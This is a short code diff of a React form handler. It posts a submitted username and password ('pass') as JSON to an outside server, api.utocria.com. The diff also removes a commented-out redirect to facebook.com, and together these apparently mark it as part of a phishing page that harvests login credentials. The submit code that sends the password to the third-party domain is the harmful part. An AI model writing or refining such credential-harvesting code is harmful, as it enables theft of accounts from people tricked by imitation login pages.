@@ -9,11 +9,16 @@ function App(){
             pass: formData.get('pass')
         }
 
-        axios.post("https://api.utocria/api/submit", data)
-            .then((response) => console.log(response.data))
-            .then((error) => console.log(error));
-        
-            //window.location.replace("http://facebook.com");
+        fetch("https://api.utocria.com/api/submit", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(data)
+        })
+        .then((response) => response.json())
+        .then((data) => console.log("Success:", data))
+        .catch((error) => console.error("Error:", error));
     }
 
     var inputClass = 'border border-form-border rounded-md h-10 w-64 lg:w-full px-2 hover:border-blue active:border-blue focus:border-blue focus:outline-none focus:ring focus:ring-blueRing';
